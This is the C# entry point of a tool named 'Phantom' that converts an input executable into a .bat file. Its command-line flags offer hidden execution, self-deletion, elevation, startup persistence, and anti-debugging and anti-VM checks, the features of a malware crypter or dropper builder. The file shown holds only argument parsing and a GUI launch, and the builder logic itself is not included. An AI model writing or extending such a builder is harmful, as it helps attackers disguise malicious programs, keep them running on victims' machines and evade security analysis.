using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace Phantom
{
    internal static class Program
    {
        [DllImport("user32.dll")]
        private static extern bool SetProcessDPIAware();

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetConsoleWindow();

        [DllImport("kernel32.dll")]
        private static extern bool AllocConsole();

        [STAThread]
        static void Main(string[] args)
        {
            SetProcessDPIAware();

            // CLI: Phantom.exe --cli <input_exe> [output_bat] [options]
            // Options: --hidden --selfdelete --runas --startup --antidebug --antivm
            if (args.Length >= 2 && args[0] == "--cli")
            {
                AllocConsole();
                string inputPath = args[1];
                int argIdx = 2;

                // output path is next arg if it doesn't start with --
                string outputPath = null;
                if (argIdx < args.Length && !args[argIdx].StartsWith("--"))
                {
                    outputPath = args[argIdx];
                    argIdx++;
                }
                if (outputPath == null)
                    outputPath = Path.ChangeExtension(inputPath, ".bat");

                // Parse remaining flags
                bool hidden = false, selfdelete = false, runas = false;
                bool startup = false, antidebug = false, antivm = false;
                for (; argIdx < args.Length; argIdx++)
                {
                    string f = args[argIdx].ToLowerInvariant();
                    if      (f == "--hidden")    hidden = true;
                    else if (f == "--selfdelete") selfdelete = true;
                    else if (f == "--runas")    runas = true;
                    else if (f == "--startup")  startup = true;
                    else if (f == "--antidebug") antidebug = true;
                    else if (f == "--antivm")   antivm = true;
                    else Console.WriteLine("Unknown flag: " + args[argIdx]);
                }

                try
                {
                    CliBuilder.Build(inputPath, outputPath, hidden, selfdelete, runas, startup, antidebug, antivm);
                    Console.WriteLine("Build succeeded: " + outputPath);
                }
                catch (Exception ex)
                {
                    Console.Error.WriteLine("Build failed: " + ex.Message);
                    Environment.Exit(1);
                }
                return;
            }

            // GUI mode
            if (!Directory.Exists(AppDomain.CurrentDomain.BaseDirectory + "\\bin"))
            {
                Directory.CreateDirectory(AppDomain.CurrentDomain.BaseDirectory + "\\bin");
            }
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new PhantomMain());
        }
    }
}
